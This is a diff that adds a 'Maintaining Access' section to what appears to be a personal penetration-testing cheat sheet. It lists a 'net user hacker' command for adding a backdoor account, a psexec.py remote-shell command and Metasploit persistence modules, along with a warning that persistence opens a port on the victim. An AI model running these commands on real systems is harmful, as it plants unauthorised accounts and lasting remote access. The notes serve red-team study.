@@ -1331,3 +1331,25 @@ or
 ### Metasploit
 if you have a meterpreter shell -->  you can use the features `upload/download`
                                to download and upload a file
+
+## Maintaining Access
+During a pentest work -->  usually you don't need to persist your access
+in a red team assessment:
+YES
+
+what usually you can do:
+- add a user -->  `net user hacker password123/add`
+- use [[cheet#psexec.py|psexec.py]] to get a shell -->  `sudo psexec.py domain/user:'password'@<victim ip>`
+
+### Metasploit
+`run persistence -h`
+`exploit/windows/local/persistence`
+`exploit/windows/local/registry_persistence`
+
+>[!warning] This is dangerous
+>bc you are -->  opening a port on the victim
+>=>
+>everyone can access to it 
+>(usually there is no reason to do that)
+
+
